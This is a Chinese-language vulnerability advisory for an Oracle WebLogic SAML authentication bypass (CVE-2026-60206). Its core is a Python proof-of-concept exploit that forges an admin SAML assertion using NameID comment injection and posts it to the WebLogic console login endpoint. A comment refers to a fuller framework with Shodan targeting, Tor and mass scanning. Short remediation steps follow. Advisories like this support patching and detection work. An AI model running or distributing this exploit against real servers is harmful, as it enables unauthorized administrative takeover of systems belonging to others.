### 漏洞描述
CVE-2026-60206 是 Oracle WebLogic Server SAML 实现中的认证绕过漏洞。低权限攻击者可通过网络访问利用 SAML 断言验证缺陷，绕过认证获取管理员权限。漏洞源于三个攻击向量：SAML 注入（恶意 SAML 响应绕过认证检查）、XML 签名包装攻击（XSW，用恶意断言包装合法签名）、NameID 操纵（注入注释或篡改 NameID 字段冒充特权用户）。成功利用可完全控制 WebLogic 服务器，且可影响依赖 WebLogic 的其他产品（scope change）。

### POC/利用
```python
#!/usr/bin/env python3
# CVE-2026-60206 Oracle WebLogic SAML Auth Bypass PoC
# 攻击方式1: SAML Injection - 构造恶意 SAML Response 绕过认证
# 攻击方式2: XSW - XML Signature Wrapping 攻击
# 攻击方式3: NameID 注释注入冒充管理员

import requests
import base64
from xml.etree import ElementTree as ET

def exploit_saml_injection(target, port=7001):
    """SAML 注入：构造恶意 SAML 断言绕过 WebLogic 认证"""
    # 构造包含管理员 NameID 的恶意 SAML Response
    saml_response = f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
      <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
        <saml:Subject>
          <saml:NameID>weblogic<!--admin-->@{target}</saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2027-01-01T00:00:00Z"/>
        <saml:AuthnStatement AuthnInstant="2026-07-24T00:00:00Z">
          <saml:AuthnContext>
            <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
          </saml:AuthnContext>
        </saml:AuthnStatement>
      </saml:Assertion>
    </samlp:Response>"""

    encoded = base64.b64encode(saml_response.encode()).decode()
    # 发送到 WebLogic SAML ACS endpoint
    resp = requests.post(
        f"https://{target}:{port}/console/j_security_check",
        data={"SAMLResponse": encoded},
        verify=False, allow_redirects=True
    )
    return resp.status_code == 200 and "console" in resp.url

# 完整利用框架见: https://github.com/tc4dy/CVE-2026-60206-PoC-Exploit
# 支持 --detect / --exploit / --shodan / --tor / mass scanning
```

### 修复建议
1. 应用 Oracle CPU（Critical Patch Update）补丁
2. 限制 SAML ACS endpoint 的网络访问
3. 启用 XML 签名验证强化
4. 监控异常 SAML 认证请求
